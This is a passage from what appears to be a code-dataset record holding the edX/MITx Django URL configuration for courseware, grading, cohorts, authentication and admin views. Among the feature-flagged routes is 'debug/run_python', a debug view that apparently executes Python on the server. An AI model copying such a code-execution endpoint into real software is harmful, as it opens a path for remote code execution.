'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        